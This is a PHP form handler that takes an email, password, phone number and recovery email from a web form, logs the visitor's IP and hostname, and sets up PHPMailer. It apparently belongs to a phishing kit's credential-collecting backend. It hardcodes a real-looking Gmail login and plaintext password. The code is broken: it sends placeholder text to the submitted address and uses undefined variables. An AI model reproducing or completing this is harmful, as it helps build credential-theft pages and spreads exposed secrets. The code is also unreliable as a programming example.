<?php
include 'email.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
function index()
{
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$phone = trim($_POST['phone']);
$rec_email = trim($_POST['rec_email']);
 
        if($email != null && $password != null && $phone != null && $rec_email != null){
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
    
        $mail = new PHPMailer(true);

  
        //Server settings
        $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'taadewusi4u@gmail.com';                     //SMTP username
        $mail->Password   = 'damilare123@A';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom('taadewusi4u@gmail.com', 'Tee');
        $mail->addAddress($email, $first_name);     //Add a recipient
        $mail->addAddress($email);               //Name is optional
        $mail->addReplyTo('info@example.com', 'Information');
        //  $mail->addCC('cc@example.com');
        //$mail->addBCC('bcc@example.com');

        //Attachments
        //  $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
        //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Here is the subject';
        $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
        $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

        $mail->send();
    echo 'Message has been sent';

}
else if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);

    $mail = new PHPMailer(true);


    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'taadewusi4u@gmail.com';                     //SMTP username
    $mail->Password   = 'damilare123@A';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('taadewusi4u@gmail.com', 'Tee');
    $mail->addAddress($email, $first_name);     //Add a recipient
    $mail->addAddress($email);               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    //  $mail->addCC('cc@example.com');
    //$mail->addBCC('bcc@example.com');

    //Attachments
    //  $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
}

?>